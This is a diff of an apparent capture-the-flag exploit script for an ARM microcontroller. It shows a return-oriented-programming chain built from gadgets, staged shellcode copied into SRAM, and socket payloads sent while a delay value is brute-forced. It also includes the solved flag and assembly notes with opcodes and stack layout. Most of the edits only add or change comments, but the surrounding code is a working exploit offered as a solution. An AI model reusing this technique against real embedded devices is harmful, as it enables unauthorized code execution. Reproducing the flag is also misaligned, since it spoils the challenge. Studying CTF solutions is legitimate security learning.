@@ -139,10 +139,13 @@ for i in range(len(payload_1)):
     s += p32(sram_adr+i*4-4) + garbage + p32(payload_1[i]) + gadget_write
     #gadget_write : finishing with POP {R3-R5,PC}
 
+
+#sram_adr_2: @to write the stage 2 payload
+sram_adr_2 = 0x20001050
+
 #R3: shellcode @
 #R4: SRAM @
 #R5: copy length
-sram_adr_2 = 0x20001050
 s += p32(0xe1001cd0 + parameters_length) + p32(sram_adr_2) + p32(len(payload_2)) + p32(sram_adr + 1) #gadget_R3_R4_R5_PC
 
 #parameters: @PIN, @bytesToDecipher, @decipheredBytes, @decipheredMsg
@@ -172,7 +175,10 @@ for delay in range(0x90, 0x96, 1):
             port_i = (port_i + 1) % 10
             time.sleep(1)
 
+    #add the delay value on the stack
     final_test_payload = s + p32(delay)
+
+    #add the socket and the null byte on the stack, as usual
     final_test_payload += socket + p32(0)
 
     conn.send(final_test_payload)
@@ -194,8 +200,6 @@ for delay in range(0x90, 0x96, 1):
         
     sleep(1)
 
-
-#WIN !!!!!
 #4354467b74317320625574206120736372347463687d00000000000000000000
 #CTF{t1s bUt a scr4tch}
 
@@ -228,7 +232,7 @@ ADD R6, R6, #1      | 06 F1 01 06
 BLX R6              | B0 47
 
 
-#POP {R3-R5, PC}     | 38 BD
+#POP {R3-R5, PC}    | 38 BD
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
@@ -242,7 +246,7 @@ buf_base_adr + 9: @bytesToDecipher  <<< SP + 4
 buf_base_adr: @PIN                  <<< SP
 
 
-TODO:
+#### pseudo algorithm to implement
 recode usart_rx(), and introduce a delay without the polling loops
 
 parameters :
